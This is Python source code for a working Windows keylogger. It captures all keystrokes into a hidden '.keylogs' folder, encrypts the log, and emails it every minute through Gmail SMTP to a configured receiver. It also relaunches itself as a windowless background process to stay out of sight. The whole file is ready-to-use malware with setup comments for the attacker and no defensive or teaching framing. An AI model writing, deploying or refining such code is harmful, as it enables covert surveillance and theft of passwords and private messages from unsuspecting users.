import os
import sys
import time
import logging
import threading
import smtplib
import schedule
from pynput import keyboard
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from cryptography.fernet import Fernet
import subprocess

# keylog.txt and key file will be saved at C:\Users\<username>\.keylogs
# Encryption setup
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Path to save the key
key_file = os.path.expanduser('~') + "\\.keylogs\\key.key" #paste this key file in decrypt_log file

# Generate and save the key if it doesn't exist
if not os.path.exists(key_file):
    key = Fernet.generate_key()
    with open(key_file, 'wb') as kf:
        kf.write(key)
else:
    with open(key_file, 'rb') as kf:
        key = kf.read()

cipher_suite = Fernet(key)

# Logging setup
log_directory = os.path.expanduser('~') + "\\.keylogs\\"
if not os.path.exists(log_directory):
    os.makedirs(log_directory)
log_file = log_directory + "keylog.txt" # you can edit keylog file name here
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Email credentials
email_address = "email-id"
email_password = "your app password" #enable 2FA of account to get app password
email_to = "reciever-email"
email_interval = 1  # in minutes

def encrypt_message(message):
    return cipher_suite.encrypt(message.encode())

def decrypt_message(encrypted_message):
    return cipher_suite.decrypt(encrypted_message).decode()

def send_email():
    try:
        with open(log_file, 'r') as file:
            log_data = file.read()
        
        if log_data:
            encrypted_log = encrypt_message(log_data)

            msg = MIMEMultipart()
            msg['From'] = email_address
            msg['To'] = email_to
            msg['Subject'] = 'Keylogger Report'

            body = "Attached is the encrypted log file."
            msg.attach(MIMEText(body, 'plain'))
            attachment = MIMEText(encrypted_log.decode('utf-8'), 'plain')
            attachment.add_header('Content-Disposition', 'attachment', filename='log.txt')
            msg.attach(attachment)

            server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
            server.ehlo()
            #server.starttls()
            server.ehlo()
            server.login(email_address, email_password)
            text = msg.as_string()
            server.sendmail(email_address, email_to, text)
            server.quit()

            with open(log_file, 'w'):
                pass  # Clear the log file after sending

    except Exception as e:
        logging.error(f"Failed to send email: {e}")

def on_press(key): # Starts Listener
    try:
        logging.info('Key {} pressed.'.format(key.char))
    except AttributeError:
        logging.info('Special Key {} pressed.'.format(key))

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop listener

def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def schedule_email():
    schedule.every(email_interval).minutes.do(send_email)
    while True:
        schedule.run_pending()
        time.sleep(1)

def run_as_background():
    if sys.platform == "win32":
        # Check if the script is already running as a background process
        if "background" in sys.argv:
            keylogger_thread = threading.Thread(target=start_keylogger)
            email_thread = threading.Thread(target=schedule_email)
            keylogger_thread.start()
            email_thread.start()
            keylogger_thread.join()
            email_thread.join()
        else:
            # Start a new background process
            subprocess.Popen([sys.executable, __file__, "background"], creationflags=subprocess.CREATE_NO_WINDOW)
            sys.exit(0)

if __name__ == "__main__":
    run_as_background()
